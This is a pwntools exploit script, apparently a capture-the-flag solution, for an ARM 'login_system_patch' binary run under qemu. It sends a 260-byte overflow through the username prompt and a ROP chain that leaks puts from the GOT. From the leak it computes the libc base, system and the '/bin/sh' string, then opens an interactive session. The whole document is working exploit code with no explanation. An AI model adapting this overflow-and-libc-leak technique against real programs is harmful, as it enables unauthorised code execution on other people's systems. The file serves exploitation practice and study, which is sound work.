from pwn import *
context(arch="arm", os="linux")
context.log_level = "debug"

p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi', './login_system_patch'])
libc = ELF("/usr/arm-linux-gnueabi/lib/libc.so.6")
elf = ELF("./login_system_patch")
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

pop_r3_pc_addr = 0x10730
mov_r0_r3_pop_r11_pc_addr = 0x106c0
payload1 = b'admin'+b'a'*(260-5)
payload1 += p32(pop_r3_pc_addr)
payload1 += p32(puts_got)
payload1 += p32(mov_r0_r3_pop_r11_pc_addr)
payload1 += p32(0)
payload1 += p32(puts_plt)

p.sendlineafter("Username:", payload1)
p.sendlineafter("Password:", payload1)
p.recvuntil("Wrong Password!\n")
puts_addr = u32(p.recv(4))
# log.success(hex(puts_addr))
libc.address = puts_addr - libc.symbols['puts']
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b"/bin/sh"))
log.success(hex(system_addr))
log.success(hex(binsh_addr))
log.success(hex(libc.address))

p.interactive()